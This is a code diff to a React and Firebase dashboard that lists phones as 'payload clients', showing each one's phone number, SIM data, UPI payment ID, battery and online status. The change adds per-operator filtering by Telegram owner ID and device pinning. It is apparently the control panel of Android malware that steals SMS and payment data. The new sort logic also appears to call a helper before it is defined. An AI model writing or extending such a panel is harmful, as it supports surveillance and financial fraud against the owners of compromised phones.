@@ -1,9 +1,10 @@
 import { useEffect, useState, useMemo } from 'react';
 import { db } from '@/lib/firebase';
-import { ref, onValue } from 'firebase/database';
+import { ref, onValue, set, remove } from 'firebase/database';
 import { Link } from 'wouter';
-import { Search, Smartphone, Battery, BatteryWarning, Wifi, WifiOff, Cpu, ChevronRight, Activity } from 'lucide-react';
+import { Search, Smartphone, Battery, BatteryWarning, Wifi, WifiOff, Pin, PinOff, Activity } from 'lucide-react';
 import { Layout } from '@/components/layout';
+import { useAuth } from '@/lib/auth';
 
 interface Device {
   id: string;
@@ -15,13 +16,17 @@ interface Device {
   ping?: string;
   sim1?: string;
   sim2?: string;
+  ownerTelegramId?: string;
 }
 
 export function Dashboard() {
+  const { isAdmin, userId } = useAuth();
   const [devices, setDevices] = useState<Device[]>([]);
   const [loading, setLoading] = useState(true);
   const [search, setSearch] = useState('');
+  const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());
 
+  // Load all devices
   useEffect(() => {
     const clientsRef = ref(db, 'clients');
     const unsubscribe = onValue(clientsRef, (snapshot) => {
@@ -29,7 +34,7 @@ export function Dashboard() {
         const data = snapshot.val();
         const devicesList = Object.keys(data).map((key) => ({
           id: key,
-          ...data[key]
+          ...data[key],
         }));
         setDevices(devicesList);
       } else {
@@ -37,27 +42,74 @@ export function Dashboard() {
       }
       setLoading(false);
     });
-
     return () => unsubscribe();
   }, []);
 
-  const filteredDevices = useMemo(() => {
-    if (!search) return devices;
-    const lowerSearch = search.toLowerCase();
-    return devices.filter(d => 
-      (d.phone && d.phone.toLowerCase().includes(lowerSearch)) ||
-      (d.model && d.model.toLowerCase().includes(lowerSearch)) ||
-      (d.upi && d.upi.toLowerCase().includes(lowerSearch)) ||
-      (d.id.toLowerCase().includes(lowerSearch))
+  // Load pinned devices for current user
+  useEffect(() => {
+    if (!userId) return;
+    const pinsRef = ref(db, `config/pins/${userId}`);
+    const unsubscribe = onValue(pinsRef, (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val() as Record<string, boolean>;
+        setPinnedIds(new Set(Object.keys(data).filter((k) => data[k])));
+      } else {
+        setPinnedIds(new Set());
+      }
+    });
+    return () => unsubscribe();
+  }, [userId]);
+
+  const togglePin = (deviceId: string, e: React.MouseEvent) => {
+    e.preventDefault();
+    e.stopPropagation();
+    if (!userId) return;
+    const pinRef = ref(db, `config/pins/${userId}/${deviceId}`);
+    if (pinnedIds.has(deviceId)) {
+      remove(pinRef);
+    } else {
+      set(pinRef, true);
+    }
+  };
+
+  // Filter: non-admin users only see their own devices
+  const visibleDevices = useMemo(() => {
+    if (isAdmin) return devices;
+    return devices.filter(
+      (d) => !d.ownerTelegramId || d.ownerTelegramId === userId
     );
-  }, [devices, search]);
+  }, [devices, isAdmin, userId]);
+
+  const filteredDevices = useMemo(() => {
+    const base = search
+      ? visibleDevices.filter((d) => {
+          const q = search.toLowerCase();
+          return (
+            (d.phone && d.phone.toLowerCase().includes(q)) ||
+            (d.model && d.model.toLowerCase().includes(q)) ||
+            (d.upi && d.upi.toLowerCase().includes(q)) ||
+            d.id.toLowerCase().includes(q)
+          );
+        })
+      : visibleDevices;
+
+    // Pinned first, then rest sorted by online status
+    return [...base].sort((a, b) => {
+      const aPinned = pinnedIds.has(a.id) ? 0 : 1;
+      const bPinned = pinnedIds.has(b.id) ? 0 : 1;
+      if (aPinned !== bPinned) return aPinned - bPinned;
+      // secondary: online first
+      const aOnline = isOnline(a.ping) ? 0 : 1;
+      const bOnline = isOnline(b.ping) ? 0 : 1;
+      return aOnline - bOnline;
+    });
+  }, [visibleDevices, search, pinnedIds]);
 
   const isOnline = (pingTimestamp: string | undefined) => {
     if (!pingTimestamp) return false;
     const pingTime = parseInt(pingTimestamp, 10);
     if (isNaN(pingTime)) return false;
-    // 5 minutes = 300000 ms
-    return (Date.now() - pingTime) < 300000;
+    return Date.now() - pingTime < 300_000;
   };
 
   const getBatteryValue = (battery: string | undefined) => {
@@ -72,13 +124,16 @@ export function Dashboard() {
           <h1 className="text-2xl font-bold font-sans tracking-tight">Active Nodes</h1>
           <p className="text-muted-foreground font-mono text-sm mt-1 flex items-center gap-2">
             <Activity className="w-4 h-4 text-primary" />
-            <span>{devices.length} devices monitored globally</span>
+            <span>
+              {filteredDevices.length} device{filteredDevices.length !== 1 ? 's' : ''}
+              {pinnedIds.size > 0 && ` · ${pinnedIds.size} pinned`}
+            </span>
           </p>
         </div>
-        
+
         <div className="relative w-full md:w-80">
           <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-          <input 
+          <input
             type="text"
             placeholder="Search phone, model, UPI..."
             value={search}
@@ -91,7 +146,7 @@ export function Dashboard() {
       {loading ? (
         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
           {[1, 2, 3, 4, 5, 6].map((i) => (
-            <div key={i} className="bg-card border border-border rounded-lg h-40 animate-pulse"></div>
+            <div key={i} className="bg-card border border-border rounded-lg h-40 animate-pulse" />
           ))}
         </div>
       ) : filteredDevices.length === 0 ? (
@@ -101,7 +156,11 @@ export function Dashboard() {
           </div>
           <h3 className="text-lg font-medium text-foreground mb-1">No devices found</h3>
           <p className="text-sm text-muted-foreground max-w-sm">
-            {search ? 'Adjust your search query to find active devices.' : 'Awaiting initial connection from payload clients.'}
+            {search
+              ? 'Adjust your search query to find active devices.'
+              : isAdmin
+              ? 'Awaiting initial connection from payload clients.'
+              : 'No devices are assigned to your account yet. Contact admin.'}
           </p>
         </div>
       ) : (
@@ -109,17 +168,22 @@ export function Dashboard() {
           {filteredDevices.map((device, i) => {
             const online = isOnline(device.ping);
             const batteryNum = getBatteryValue(device.battery);
-            
+            const isPinned = pinnedIds.has(device.id);
+
             return (
-              <Link 
-                key={device.id} 
+              <Link
+                key={device.id}
                 href={`/device/${device.id}`}
-                className="group bg-card border border-border hover:border-primary/50 rounded-lg p-4 flex flex-col relative overflow-hidden transition-all hover:shadow-[0_0_15px_rgba(57,211,83,0.1)] block"
+                className={`group bg-card border rounded-lg p-4 flex flex-col relative overflow-hidden transition-all hover:shadow-[0_0_15px_rgba(57,211,83,0.1)] block ${
+                  isPinned
+                    ? 'border-primary/40 hover:border-primary/70'
+                    : 'border-border hover:border-primary/50'
+                }`}
                 style={{ animationDelay: `${i * 50}ms` }}
               >
-                {/* Status Indicator */}
-                <div className="absolute top-0 left-0 w-1 h-full bg-transparent group-hover:bg-primary/50 transition-colors"></div>
-                
+                {/* Pinned accent bar */}
+                <div className={`absolute top-0 left-0 w-1 h-full transition-colors ${isPinned ? 'bg-primary/60' : 'bg-transparent group-hover:bg-primary/30'}`} />
+
                 <div className="flex justify-between items-start mb-4">
                   <div className="flex items-center gap-2">
                     <div className="bg-secondary rounded p-2 border border-border">
@@ -127,20 +191,37 @@ export function Dashboard() {
                     </div>
                     <div>
                       <div className="text-xs font-mono text-muted-foreground">NODE_{i.toString().padStart(3, '0')}</div>
-                      <div className="font-semibold text-sm truncate w-32" title={device.model || 'Unknown Model'}>
+                      <div className="font-semibold text-sm truncate w-28" title={device.model || 'Unknown Model'}>
                         {device.model || 'Unknown Model'}
                       </div>
                     </div>
                   </div>
-                  
-                  <div className="flex items-center gap-1.5 bg-background border border-border px-2 py-1 rounded-full text-xs font-mono">
-                    <span className="relative flex h-2 w-2">
-                      {online && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75"></span>}
-                      <span className={`relative inline-flex rounded-full h-2 w-2 ${online ? 'bg-primary' : 'bg-muted-foreground'}`}></span>
-                    </span>
-                    <span className={online ? 'text-primary' : 'text-muted-foreground'}>
-                      {online ? 'LIVE' : 'OFF'}
-                    </span>
+
+                  <div className="flex items-center gap-1">
+                    {/* Pin button */}
+                    <button
+                      onClick={(e) => togglePin(device.id, e)}
+                      title={isPinned ? 'Unpin' : 'Pin to top'}
+                      className={`p-1.5 rounded transition-all opacity-0 group-hover:opacity-100 ${
+                        isPinned
+                          ? 'opacity-100 text-primary bg-primary/10 hover:bg-primary/20'
+                          : 'text-muted-foreground hover:text-primary hover:bg-secondary'
+                      }`}
+                    >
+                      {isPinned ? <PinOff className="w-3.5 h-3.5" /> : <Pin className="w-3.5 h-3.5" />}
+                    </button>
+
+                    <div className="flex items-center gap-1.5 bg-background border border-border px-2 py-1 rounded-full text-xs font-mono">
+                      <span className="relative flex h-2 w-2">
+                        {online && (
+                          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75" />
+                        )}
+                        <span className={`relative inline-flex rounded-full h-2 w-2 ${online ? 'bg-primary' : 'bg-muted-foreground'}`} />
+                      </span>
+                      <span className={online ? 'text-primary' : 'text-muted-foreground'}>
+                        {online ? 'LIVE' : 'OFF'}
+                      </span>
+                    </div>
                   </div>
                 </div>
 
@@ -154,7 +235,7 @@ export function Dashboard() {
                     <span className="font-medium font-mono text-xs text-primary/90">{device.upi || 'N/A'}</span>
                   </div>
                 </div>
-                
+
                 <div className="mt-4 pt-3 border-t border-border flex items-center justify-between">
                   <div className="flex items-center gap-3">
                     <div className="flex items-center gap-1 text-xs text-muted-foreground font-mono">
@@ -165,8 +246,13 @@ export function Dashboard() {
                       )}
                       <span className={batteryNum <= 20 ? 'text-warning' : ''}>{device.battery || '0%'}</span>
                     </div>
+                    {device.ownerTelegramId && isAdmin && (
+                      <span className="text-[10px] font-mono text-muted-foreground bg-secondary/50 px-1.5 py-0.5 rounded border border-border">
+                        {device.ownerTelegramId.slice(0, 8)}…
+                      </span>
+                    )}
                   </div>
-                  <ChevronRight className="w-4 h-4 text-muted-foreground group-hover:text-primary transition-colors group-hover:translate-x-1" />
+                  <svg className="w-4 h-4 text-muted-foreground group-hover:text-primary transition-colors group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" /></svg>
                 </div>
               </Link>
             );
